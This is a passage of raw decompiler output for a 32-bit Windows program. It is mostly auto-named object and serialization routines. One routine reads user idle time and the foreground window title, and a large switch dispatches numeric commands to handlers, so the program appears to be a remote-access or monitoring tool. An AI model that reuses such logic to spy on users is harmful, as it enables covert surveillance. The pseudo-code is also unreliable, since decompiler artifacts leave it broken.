    int32_t v1; // 0x40502e
    *(int32_t *)v1 = (int32_t)&g56;
    int32_t result = function_406f1d(); // 0x40503a
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x405045 - 0x405072
int32_t function_405045(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t result; // 0x405045
    *(int32_t *)(result + 4) = a1;
    *(int32_t *)result = (int32_t)&g56;
    function_404656((int32_t)&v1);
    function_406f1d();
    return result;
}

// Address range: 0x405072 - 0x4050ae
int32_t function_405072(int32_t result) {
    // 0x405072
    int128_t v1; // 0x405072
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_404767((int32_t)&g322);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x4050ae - 0x4050b5
int32_t function_4050ae(void) {
    // 0x4050ae
    int32_t result; // 0x4050ae
    *(int32_t *)result = (int32_t)&g57;
    return result;
}

// Address range: 0x4050b5 - 0x4050ca
int32_t function_4050b5(int32_t a1) {
    // 0x4050b5
    int32_t result; // 0x4050b5
    *(int32_t *)(result + 4) = a1;
    *(int32_t *)result = (int32_t)&g57;
    return result;
}

// Address range: 0x4050ca - 0x4050e1
int32_t function_4050ca(void) {
    // 0x4050ca
    int32_t v1; // 0x4050ca
    *(int32_t *)v1 = (int32_t)&g58;
    int32_t result = function_406f1d(); // 0x4050d6
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x4050e1 - 0x405168
int32_t function_4050e1(int32_t result) {
    // 0x4050e1
    int128_t v1; // 0x4050e1
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x4050e1
    function_404767(*(int32_t *)(v3 + 4));
    function_404788(v3 + 8);
    function_404767(*(int32_t *)(v3 + 12));
    function_404767(*(int32_t *)(v3 + 16));
    function_404767(*(int32_t *)(v3 + 20));
    function_404767(*(int32_t *)(v3 + 24));
    function_4046a9(*(int32_t *)(v3 + 28));
    function_404767(*(int32_t *)(v3 + 32));
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x405168 - 0x4051b9
int32_t function_405168(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = a2;
    int32_t result; // 0x405168
    *(int32_t *)(result + 4) = a1;
    *(int32_t *)result = (int32_t)&g58;
    function_404656((int32_t)&v1);
    *(int32_t *)(result + 12) = a3;
    *(int32_t *)(result + 16) = a4;
    *(int32_t *)(result + 20) = a5;
    *(int32_t *)(result + 24) = a6;
    *(int32_t *)(result + 28) = a7;
    *(int32_t *)(result + 32) = a8;
    function_406f1d();
    return result;
}

// Address range: 0x4051b9 - 0x4051ca
int32_t function_4051b9(int32_t result) {
    // 0x4051b9
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    return result;
}

// Address range: 0x4051ca - 0x4051d1
int32_t function_4051ca(void) {
    // 0x4051ca
    int32_t result; // 0x4051ca
    *(int32_t *)result = (int32_t)&g59;
    return result;
}

// Address range: 0x4051d1 - 0x40527a
int32_t function_4051d1(int32_t result) {
    // 0x4051d1
    int128_t v1; // 0x4051d1
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x4051d1
    function_4046a9(v3 + 4);
    function_404767(*(int32_t *)(v3 + 12));
    function_404767(*(int32_t *)(v3 + 16));
    function_404767(*(int32_t *)(v3 + 20));
    function_404767(*(int32_t *)(v3 + 24));
    function_404788(v3 + 28);
    function_404788(v3 + 32);
    function_404767(*(int32_t *)(v3 + 36));
    function_404767(*(int32_t *)(v3 + 40));
    function_404788(v3 + 44);
    function_404788(v3 + 48);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x40527a - 0x4052bc
int32_t function_40527a(void) {
    // 0x40527a
    int32_t v1; // 0x40527a
    *(int32_t *)v1 = (int32_t)&g60;
    function_406f1d();
    *(int32_t *)(v1 + 48) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 44) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 32) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 28) = 0;
    return function_404081();
}

// Address range: 0x4052bc - 0x405363
int32_t function_4052bc(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10) {
    int32_t v1 = a10;
    int32_t v2 = a9;
    int32_t v3 = a6;
    int32_t v4 = a5;
    int32_t result; // 0x4052bc
    *(int32_t *)result = (int32_t)&g60;
    int32_t v5; // 0x4052bc
    function_404094((int32_t)&v5);
    *(int32_t *)(result + 12) = a1;
    *(int32_t *)(result + 16) = a2;
    *(int32_t *)(result + 20) = a3;
    *(int32_t *)(result + 24) = a4;
    function_404656((int32_t)&v4);
    function_404656((int32_t)&v3);
    *(int32_t *)(result + 36) = a7;
    *(int32_t *)(result + 40) = a8;
    function_404656((int32_t)&v2);
    function_404656((int32_t)&v1);
    function_404081();
    function_406f1d();
    v4 = 0;
    function_406f1d();
    v3 = 0;
    function_406f1d();
    v2 = 0;
    function_406f1d();
    return result;
}

// Address range: 0x405363 - 0x4053ae
int32_t function_405363(int32_t result) {
    // 0x405363
    int128_t v1; // 0x405363
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x405363
    function_404767(*(int32_t *)(v3 + 4));
    function_404788(v3 + 8);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x4053ae - 0x4053c5
int32_t function_4053ae(void) {
    // 0x4053ae
    int32_t v1; // 0x4053ae
    *(int32_t *)v1 = (int32_t)&g61;
    int32_t result = function_406f1d(); // 0x4053ba
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x4053c5 - 0x4053f2
int32_t function_4053c5(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t result; // 0x4053c5
    *(int32_t *)(result + 4) = a1;
    *(int32_t *)result = (int32_t)&g61;
    function_404656((int32_t)&v1);
    function_406f1d();
    return result;
}

// Address range: 0x4053f2 - 0x4054ac
int32_t function_4053f2(int32_t result) {
    // 0x4053f2
    int128_t v1; // 0x4053f2
    int128_t v2 = v1;
    int32_t v3; // bp-72, 0x4053f2
    int32_t v4 = &v3; // 0x4053fd
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v5; // 0x4053f2
    int32_t * v6 = (int32_t *)(v5 + 12); // 0x405416
    int32_t v7 = 0; // 0x405419
    if (*v6 == 0) {
        // 0x40548b
        *(int32_t *)(v4 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    int32_t v8 = v4;
    *(int32_t *)(v8 - 4) = v7;
    *(int32_t *)(v8 - 8) = v8 + 40;
    int32_t v9 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x405426
    *(int32_t *)(v8 - 12) = v9;
    function_404788((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v8 - 16) = v7;
    *(int32_t *)(v8 - 20) = v8 + 28;
    int32_t v10 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x405446
    *(int32_t *)(v8 - 24) = *(int32_t *)(v10 + 16);
    function_404767((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v8 - 28) = v7;
    *(int32_t *)(v8 - 32) = v8 + 16;
    int32_t v11 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x405468
    *(int32_t *)(v8 - 36) = *(int32_t *)(v11 + 12);
    int32_t v12 = v8 - 40; // 0x405474
    *(int32_t *)v12 = *(int32_t *)(v11 + 8);
    function_404740((int32_t)&g322, (int32_t)&g322);
    function_406f1d();
    v7++;
    while (v7 < *v6) {
        // 0x40541e
        v8 = v12;
        *(int32_t *)(v8 - 4) = v7;
        *(int32_t *)(v8 - 8) = v8 + 40;
        v9 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v8 - 12) = v9;
        function_404788((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v8 - 16) = v7;
        *(int32_t *)(v8 - 20) = v8 + 28;
        v10 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v8 - 24) = *(int32_t *)(v10 + 16);
        function_404767((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v8 - 28) = v7;
        *(int32_t *)(v8 - 32) = v8 + 16;
        v11 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v8 - 36) = *(int32_t *)(v11 + 12);
        v12 = v8 - 40;
        *(int32_t *)v12 = *(int32_t *)(v11 + 8);
        function_404740((int32_t)&g322, (int32_t)&g322);
        function_406f1d();
        v7++;
    }
    // 0x40548b
    *(int32_t *)(v12 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x4054ac - 0x4054ba
int32_t function_4054ac(int32_t a1, int32_t a2) {
    // 0x4054ac
    int32_t v1; // 0x4054ac
    *(int32_t *)v1 = (int32_t)&g62;
    return function_401586();
}

// Address range: 0x4054ba - 0x4054e1
int32_t function_4054ba(void) {
    // 0x4054ba
    int32_t result; // 0x4054ba
    *(int32_t *)result = (int32_t)&g62;
    int32_t v1; // 0x4054ba
    function_40153f(&v1);
    function_401586();
    return result;
}

// Address range: 0x4054e1 - 0x405580
int32_t function_4054e1(int32_t result) {
    // 0x4054e1
    int128_t v1; // 0x4054e1
    int128_t v2 = v1;
    int128_t v3 = __asm_xorps(v2, v2); // 0x4054ef
    int32_t v4; // bp-72, 0x4054e1
    int32_t v5 = &v4; // 0x4054fe
    __asm_movups(v1, v3);
    int32_t v6; // 0x4054e1
    int32_t * v7 = (int32_t *)(v6 + 12); // 0x405506
    int32_t v8 = v5; // 0x405509
    int32_t v9 = 0; // 0x405509
    if (*v7 == 0) {
        // 0x40555f
        *(int32_t *)(v5 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    *(int32_t *)(v8 - 4) = v9;
    int32_t v10 = v8 + 16; // 0x40550c
    *(int32_t *)(v8 - 8) = v10;
    int32_t v11 = function_401a81((int32_t)&g322, (int32_t)&g322); // 0x405514
    *(int32_t *)(v8 - 12) = v11;
    function_404788((int32_t)&g322);
    function_406f1d();
    int32_t * v12 = (int32_t *)(v8 + 4); // 0x40552c
    *v12 = 0;
    *(int32_t *)(v8 - 16) = v9;
    *(int32_t *)(v8 - 20) = v10;
    int32_t v13 = function_401a81((int32_t)&g322, (int32_t)&g322); // 0x40553a
    v8 -= 24;
    *(int32_t *)v8 = *(int32_t *)(v13 + 4);
    function_404767((int32_t)&g322);
    function_406f1d();
    *v12 = 0;
    v9++;
    while (v9 < *v7) {
        // 0x40550b
        *(int32_t *)(v8 - 4) = v9;
        v10 = v8 + 16;
        *(int32_t *)(v8 - 8) = v10;
        v11 = function_401a81((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v8 - 12) = v11;
        function_404788((int32_t)&g322);
        function_406f1d();
        v12 = (int32_t *)(v8 + 4);
        *v12 = 0;
        *(int32_t *)(v8 - 16) = v9;
        *(int32_t *)(v8 - 20) = v10;
        v13 = function_401a81((int32_t)&g322, (int32_t)&g322);
        v8 -= 24;
        *(int32_t *)v8 = *(int32_t *)(v13 + 4);
        function_404767((int32_t)&g322);
        function_406f1d();
        *v12 = 0;
        v9++;
    }
    // 0x40555f
    *(int32_t *)(v8 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x405580 - 0x40558e
int32_t function_405580(int32_t a1, int32_t a2) {
    // 0x405580
    int32_t v1; // 0x405580
    *(int32_t *)v1 = (int32_t)&g63;
    return function_401524();
}

// Address range: 0x40558e - 0x4055b5
int32_t function_40558e(void) {
    // 0x40558e
    int32_t result; // 0x40558e
    *(int32_t *)result = (int32_t)&g63;
    int32_t v1; // 0x40558e
    function_4014dd(&v1);
    function_401524();
    return result;
}

// Address range: 0x4055b5 - 0x40566f
int32_t function_4055b5(int32_t result) {
    // 0x4055b5
    int128_t v1; // 0x4055b5
    int128_t v2 = v1;
    int32_t v3; // bp-80, 0x4055b5
    int32_t v4 = &v3; // 0x4055c0
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v5; // 0x4055b5
    int32_t * v6 = (int32_t *)(v5 + 12); // 0x4055d9
    int32_t v7 = v4; // 0x4055dc
    int32_t v8 = 0; // 0x4055dc
    if (*v6 == 0) {
        // 0x40564e
        *(int32_t *)(v4 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    *(int32_t *)(v7 - 4) = v8;
    int32_t v9 = v7 + 12; // 0x4055e2
    *(int32_t *)(v7 - 8) = v9;
    int32_t v10 = *(int32_t *)function_4018fe((int32_t)&g322, (int32_t)&g322); // 0x4055f2
    *(int32_t *)(v7 - 12) = v10;
    function_404767((int32_t)&g322);
    function_4015fb();
    *(int32_t *)(v7 - 16) = v8;
    *(int32_t *)(v7 - 20) = v9;
    int32_t v11 = function_4018fe((int32_t)&g322, (int32_t)&g322); // 0x40560a
    *(int32_t *)(v7 - 24) = v11 + 4;
    function_404788((int32_t)&g322);
    function_4015fb();
    *(int32_t *)(v7 - 28) = v8;
    *(int32_t *)(v7 - 32) = v9;
    int32_t v12 = function_4018fe((int32_t)&g322, (int32_t)&g322); // 0x40562d
    v7 -= 36;
    *(int32_t *)v7 = v12 + 8;
    function_404788((int32_t)&g322);
    function_4015fb();
    v8++;
    while (v8 < *v6) {
        // 0x4055e1
        *(int32_t *)(v7 - 4) = v8;
        v9 = v7 + 12;
        *(int32_t *)(v7 - 8) = v9;
        v10 = *(int32_t *)function_4018fe((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v7 - 12) = v10;
        function_404767((int32_t)&g322);
        function_4015fb();
        *(int32_t *)(v7 - 16) = v8;
        *(int32_t *)(v7 - 20) = v9;
        v11 = function_4018fe((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v7 - 24) = v11 + 4;
        function_404788((int32_t)&g322);
        function_4015fb();
        *(int32_t *)(v7 - 28) = v8;
        *(int32_t *)(v7 - 32) = v9;
        v12 = function_4018fe((int32_t)&g322, (int32_t)&g322);
        v7 -= 36;
        *(int32_t *)v7 = v12 + 8;
        function_404788((int32_t)&g322);
        function_4015fb();
        v8++;
    }
    // 0x40564e
    *(int32_t *)(v7 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x40566f - 0x40567d
int32_t function_40566f(int32_t a1, int32_t a2) {
    // 0x40566f
    int32_t v1; // 0x40566f
    *(int32_t *)v1 = (int32_t)&g64;
    return function_4014c2();
}

// Address range: 0x40567d - 0x4056a4
int32_t function_40567d(void) {
    // 0x40567d
    int32_t result; // 0x40567d
    *(int32_t *)result = (int32_t)&g64;
    int32_t v1; // 0x40567d
    function_40147b(&v1);
    function_4014c2();
    return result;
}

// Address range: 0x4056a4 - 0x40579a
int32_t function_4056a4(int32_t result) {
    // 0x4056a4
    int128_t v1; // 0x4056a4
    int128_t v2 = v1;
    int128_t v3 = __asm_xorps(v2, v2); // 0x4056b2
    int32_t v4; // bp-112, 0x4056a4
    int32_t v5 = &v4; // 0x4056c1
    __asm_movups(v1, v3);
    int32_t v6; // 0x4056a4
    int32_t * v7 = (int32_t *)(v6 + 12); // 0x4056c9
    int32_t v8 = 0; // 0x4056cc
    if (*v7 == 0) {
        // 0x405779
        *(int32_t *)(v5 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    int32_t v9 = v5;
    *(int32_t *)(v9 - 4) = v8;
    int32_t v10 = v9 + 16; // 0x4056d6
    *(int32_t *)(v9 - 8) = v10;
    int32_t v11 = function_401766((int32_t)&g322, (int32_t)&g322); // 0x4056dd
    *(int32_t *)(v9 - 12) = v11;
    function_404788((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v9 + 4) = 0;
    *(int32_t *)(v9 - 16) = v8;
    *(int32_t *)(v9 - 20) = v9 + 20;
    int32_t v12 = function_401766((int32_t)&g322, (int32_t)&g322); // 0x405702
    *(int32_t *)(v9 - 24) = *(int32_t *)(v12 + 4);
    function_404767((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v9 + 8) = 0;
    *(int32_t *)(v9 - 28) = v8;
    *(int32_t *)(v9 - 32) = v9 + 24;
    int32_t v13 = function_401766((int32_t)&g322, (int32_t)&g322); // 0x405729
    *(int32_t *)(v9 - 36) = *(int32_t *)(v13 + 8);
    function_404767((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v9 + 12) = 0;
    *(int32_t *)(v9 - 40) = v8;
    *(int32_t *)(v9 - 44) = v9 + 28;
    int32_t v14 = function_401766((int32_t)&g322, (int32_t)&g322); // 0x405750
    int32_t v15 = v9 - 48; // 0x405759
    *(int32_t *)v15 = *(int32_t *)(v14 + 12);
    function_404767((int32_t)&g322);
    function_406f1d();
    *(int32_t *)v10 = 0;
    v8++;
    while (v8 < *v7) {
        // 0x4056d5
        v9 = v15;
        *(int32_t *)(v9 - 4) = v8;
        v10 = v9 + 16;
        *(int32_t *)(v9 - 8) = v10;
        v11 = function_401766((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 12) = v11;
        function_404788((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v9 + 4) = 0;
        *(int32_t *)(v9 - 16) = v8;
        *(int32_t *)(v9 - 20) = v9 + 20;
        v12 = function_401766((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 24) = *(int32_t *)(v12 + 4);
        function_404767((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v9 + 8) = 0;
        *(int32_t *)(v9 - 28) = v8;
        *(int32_t *)(v9 - 32) = v9 + 24;
        v13 = function_401766((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 36) = *(int32_t *)(v13 + 8);
        function_404767((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v9 + 12) = 0;
        *(int32_t *)(v9 - 40) = v8;
        *(int32_t *)(v9 - 44) = v9 + 28;
        v14 = function_401766((int32_t)&g322, (int32_t)&g322);
        v15 = v9 - 48;
        *(int32_t *)v15 = *(int32_t *)(v14 + 12);
        function_404767((int32_t)&g322);
        function_406f1d();
        *(int32_t *)v10 = 0;
        v8++;
    }
    // 0x405779
    *(int32_t *)(v15 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x40579a - 0x4057a8
int32_t function_40579a(int32_t a1, int32_t a2) {
    // 0x40579a
    int32_t v1; // 0x40579a
    *(int32_t *)v1 = (int32_t)&g65;
    return function_401460();
}

// Address range: 0x4057a8 - 0x4057cf
int32_t function_4057a8(void) {
    // 0x4057a8
    int32_t result; // 0x4057a8
    *(int32_t *)result = (int32_t)&g65;
    int32_t v1; // 0x4057a8
    function_401419(&v1);
    function_401460();
    return result;
}

// Address range: 0x4057cf - 0x40586e
int32_t function_4057cf(int32_t result) {
    // 0x4057cf
    int128_t v1; // 0x4057cf
    int128_t v2 = v1;
    int32_t plii = 8; // bp-16, 0x4057dc
    GetLastInputInfo((struct tagLASTINPUTINFO *)&plii);
    GetTickCount();
    int32_t lpString; // bp-552, 0x4057cf
    GetWindowTextW(GetForegroundWindow(), (int16_t *)&lpString, 256);
    function_40460a((int16_t *)&lpString);
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_404767((int32_t)&g322);
    int32_t v3; // bp-8, 0x4057cf
    function_404788((int32_t)&v3);
    function_4046da(result);
    function_4046c6();
    function_406f1d();
    return result;
}

// Address range: 0x40586e - 0x405875
int32_t function_40586e(void) {
    // 0x40586e
    int32_t result; // 0x40586e
    *(int32_t *)result = (int32_t)&g66;
    return result;
}

// Address range: 0x405875 - 0x40587e
int32_t function_405875(void) {
    // 0x405875
    int32_t result; // 0x405875
    *(int32_t *)result = (int32_t)&g66;
    return result;
}

// Address range: 0x40587e - 0x405966
int32_t function_40587e(int32_t result) {
    // 0x40587e
    int128_t v1; // 0x40587e
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_404788((int32_t)&g322);
    int32_t v3; // 0x40587e
    function_404767(*(int32_t *)(v3 + 8));
    function_40468e((int32_t)*(int16_t *)(v3 + 12));
    int32_t v4 = v3 + 16; // 0x4058c5
    int32_t v5 = v4; // bp-88, 0x4058c8
    int32_t v6 = &v5; // 0x4058c8
    function_404788(v4);
    int32_t * v7 = (int32_t *)(v3 + 28); // 0x4058d0
    int32_t v8 = 0; // 0x4058d3
    if (*v7 == 0) {
        // 0x405945
        *(int32_t *)(v6 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    int32_t v9 = v6;
    *(int32_t *)(v9 - 4) = v8;
    *(int32_t *)(v9 - 8) = v9 + 40;
    int32_t v10 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x4058e0
    *(int32_t *)(v9 - 12) = v10;
    function_404788((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v9 - 16) = v8;
    *(int32_t *)(v9 - 20) = v9 + 28;
    int32_t v11 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x405900
    *(int32_t *)(v9 - 24) = *(int32_t *)(v11 + 16);
    function_404767((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v9 - 28) = v8;
    *(int32_t *)(v9 - 32) = v9 + 16;
    int32_t v12 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x405922
    *(int32_t *)(v9 - 36) = *(int32_t *)(v12 + 12);
    int32_t v13 = v9 - 40; // 0x40592e
    *(int32_t *)v13 = *(int32_t *)(v12 + 8);
    function_404740((int32_t)&g322, (int32_t)&g322);
    function_406f1d();
    v8++;
    while (v8 < *v7) {
        // 0x4058d8
        v9 = v13;
        *(int32_t *)(v9 - 4) = v8;
        *(int32_t *)(v9 - 8) = v9 + 40;
        v10 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 12) = v10;
        function_404788((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v9 - 16) = v8;
        *(int32_t *)(v9 - 20) = v9 + 28;
        v11 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 24) = *(int32_t *)(v11 + 16);
        function_404767((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v9 - 28) = v8;
        *(int32_t *)(v9 - 32) = v9 + 16;
        v12 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 36) = *(int32_t *)(v12 + 12);
        v13 = v9 - 40;
        *(int32_t *)v13 = *(int32_t *)(v12 + 8);
        function_404740((int32_t)&g322, (int32_t)&g322);
        function_406f1d();
        v8++;
    }
    // 0x405945
    *(int32_t *)(v13 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x405966 - 0x405980
int32_t function_405966(void) {
    // 0x405966
    int32_t v1; // 0x405966
    *(int32_t *)v1 = (int32_t)&g67;
    function_401586();
    return function_4022f8();
}

// Address range: 0x405980 - 0x4059d7
int32_t function_405980(int32_t a1, int32_t a2) {
    // 0x405980
    int32_t result; // 0x405980
    *(int32_t *)result = (int32_t)&g67;
    int32_t v1; // 0x405980
    function_404656((int32_t)&v1);
    *(int32_t *)(result + 8) = a1;
    *(int16_t *)(result + 12) = (int16_t)a2;
    int32_t v2; // bp+16, 0x405980
    function_404656((int32_t)&v2);
    int32_t v3; // bp+20, 0x405980
    function_40153f(&v3);
    function_4022f8();
    function_401586();
    return result;
}

// Address range: 0x4059d7 - 0x4059ee
int32_t function_4059d7(void) {
    // 0x4059d7
    int32_t v1; // 0x4059d7
    *(int32_t *)v1 = (int32_t)&g68;
    int32_t result = function_406f1d(); // 0x4059e3
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x4059ee - 0x405a39
int32_t function_4059ee(int32_t result) {
    // 0x4059ee
    int128_t v1; // 0x4059ee
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x4059ee
    function_404788(v3 + 4);
    function_404767(*(int32_t *)(v3 + 8));
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x405a39 - 0x405a67
int32_t function_405a39(int32_t a1) {
    int32_t v1 = a1;
    int32_t result; // 0x405a39
    *(int32_t *)result = (int32_t)&g68;
    *(int32_t *)(result + 4) = 0;
    function_4043c7((int32_t)&v1);
    *(int32_t *)(result + 8) = 0;
    function_406f1d();
    return result;
}

// Address range: 0x405a67 - 0x405ab4
int32_t function_405a67(int32_t result) {
    // 0x405a67
    int128_t v1; // 0x405a67
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x405a67
    int32_t * v4 = (int32_t *)(v3 + 4); // 0x405a85
    function_404767(*(int32_t *)(*v4 + 4));
    function_4046a9(*v4);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x405ab4 - 0x405abb
int32_t function_405ab4(void) {
    // 0x405ab4
    int32_t result; // 0x405ab4
    *(int32_t *)result = (int32_t)&g69;
    return result;
}

// Address range: 0x405abb - 0x405ad0
int32_t function_405abb(int32_t a1) {
    // 0x405abb
    int32_t result; // 0x405abb
    *(int32_t *)(result + 4) = a1;
    *(int32_t *)result = (int32_t)&g69;
    return result;
}

// Address range: 0x405ad0 - 0x405b26
int32_t function_405ad0(int32_t result) {
    // 0x405ad0
    int128_t v1; // 0x405ad0
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x405ad0
    function_404767(*(int32_t *)(v3 + 4));
    function_404788(v3 + 8);
    function_404788(v3 + 12);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x405b26 - 0x405b49
int32_t function_405b26(void) {
    // 0x405b26
    int32_t v1; // 0x405b26
    *(int32_t *)v1 = (int32_t)&g70;
    function_406f1d();
    *(int32_t *)(v1 + 12) = 0;
    int32_t result = function_406f1d(); // 0x405b3e
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x405b49 - 0x405b78
int32_t function_405b49(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405b49
    int32_t result; // 0x405b49
    *(int32_t *)result = (int32_t)&g70;
    *(int32_t *)(result + 4) = a1;
    function_404656(a2);
    function_404656(a3);
    return result;
}

// Address range: 0x405b78 - 0x405ba0
int32_t function_405b78(void) {
    // 0x405b78
    int32_t v1; // 0x405b78
    *(int32_t *)v1 = (int32_t)&g71;
    function_406f1d();
    function_406ccd();
    return function_4065d1();
}

// Address range: 0x405ba0 - 0x405bc2
int32_t function_405ba0(void) {
    // 0x405ba0
    g158 = 0;
    function_412798();
    function_4163bc();
    return function_4065fd();
}

// Address range: 0x405bc2 - 0x405e60
int32_t function_405bc2(int32_t a1, int32_t a2) {
    // 0x405bc2
    int32_t v1; // 0x405bc2
    int32_t v2 = v1;
    if (a2 == 0) {
        // 0x405e4d
        int32_t result; // 0x405bc2
        return result;
    }
    // 0x405bd5
    int32_t v3; // bp-16, 0x405bc2
    int32_t v4 = &v3; // 0x405bc9
    int32_t v5; // 0x405bc2
    int32_t v6; // bp-20, 0x405bc2
    int32_t v7; // bp-24, 0x405bc2
    if (a1 > 34) {
        if (a1 > 72) {
            switch (a1) {
                case 74: {
                    // 0x405e3e
                    function_403bb2();
                    v5 = v4;
                    // break -> 0x405e45
                    break;
                }
                case 76: {
                    // 0x405e35
                    function_40314b(v1, v2, v1);
                    v5 = v4;
                    // break -> 0x405e45
                    break;
                }
                default: {
                    int32_t v8 = a1 - 78; // 0x405e1a
                    if (v8 == 0) {
                        // 0x405e2d
                        function_411f55(v2);
                        v5 = &v6;
                    } else {
                        // 0x405e1f
                        v5 = v4;
                        if (v8 == 4) {
                            // 0x405e24
                            function_410210(v2);
                            v5 = &v7;
                        }
                    }
                    // break -> 0x405e45
                    break;
                }
            }
            goto lab_0x405e45;
        } else {
            if (a1 == 72) {
                // 0x405e05
                function_4034d1();
                v5 = v4;
                goto lab_0x405e45;
            } else {
                if (a1 > 48) {
                    // 0x405dc2
                    v5 = v4;
                    switch (a1) {
                        case 50: {
                            goto lab_0x405e45;
                        }
                        case 53: {
                            // 0x405dfe
                            function_40397f();
                            v5 = v4;
                            goto lab_0x405e45;
                        }
                        case 56: {
                            // 0x405ded
                            v6 = a2;
                            function_40358c(a2);
                            // 0x405c44
                            v5 = (int32_t)&v6 + 4;
                            goto lab_0x405e45;
                        }
                        default: {
                            int32_t v9 = a1 - 58; // 0x405dd2
                            if (v9 == 0) {
                                // 0x405de4
                                function_403556(v1, v2, v1);
                                v5 = v4;
                            } else {
                                // 0x405dd7
                                v5 = v4;
                                if (v9 == 2) {
                                    // 0x405ddd
                                    function_40353f(v1, v2, v1);
                                    v5 = v4;
                                }
                            }
                            goto lab_0x405e45;
                        }
                    }
                } else {
                    uint32_t v10 = a1 - 36;
                    switch (v10 / 2 || 0x80000000 * v10) {
                        case 6: {
                            // 0x405db1
                            v6 = a2;
                            function_4035cc(a2);
                            // 0x405c44
                            v5 = (int32_t)&v6 + 4;
                            goto lab_0x405e45;
                        }
                        case 0: {
                            // 0x405da4
                            v6 = 0;
                            function_40bd63(v2, 0);
                            v5 = &v7;
                            goto lab_0x405e45;
                        }
                        case 1: {
                            // 0x405d99
                            function_40bd1d(v2);
                            v5 = &v6;
                            goto lab_0x405e45;
                        }
                        case 2: {
                            int32_t v11 = *(int32_t *)(v2 + 572); // 0x405d88
                            v7 = v11;
                            function_4120e9(v2, v11);
                            int32_t v12; // bp-28, 0x405bc2
                            v5 = &v12;
                            goto lab_0x405e45;
                        }
                        default: {
                            int32_t v13 = a1 - 42; // 0x405d58
